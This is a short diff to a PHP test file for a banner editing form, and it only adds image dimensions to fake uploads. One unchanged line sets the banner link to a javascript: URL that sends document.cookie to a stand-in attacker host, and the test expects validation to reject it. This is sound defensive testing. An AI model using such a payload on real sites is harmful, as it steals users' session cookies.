@@ -41,7 +41,7 @@ test('a banner link cannot carry a javascript scheme', function () {
         ->set('title.en', 'Hero')
         ->set('destination', 'custom')
         ->set('linkUrl', 'javascript:fetch("//evil.example.com?c="+document.cookie)')
-        ->set('image', UploadedFile::fake()->image('hero.jpg'))
+        ->set('image', UploadedFile::fake()->image('hero.jpg', 1200, 400))
         ->call('save')
         ->assertHasErrors(['linkUrl']);
 });
@@ -64,7 +64,7 @@ test('ordinary banner links still save', function () {
             ->set('title.en', 'Hero')
             ->set('destination', 'custom')
             ->set('linkUrl', $url)
-            ->set('image', UploadedFile::fake()->image('hero.jpg'))
+            ->set('image', UploadedFile::fake()->image('hero.jpg', 1200, 400))
             ->call('save')
             ->assertHasNoErrors();
     }
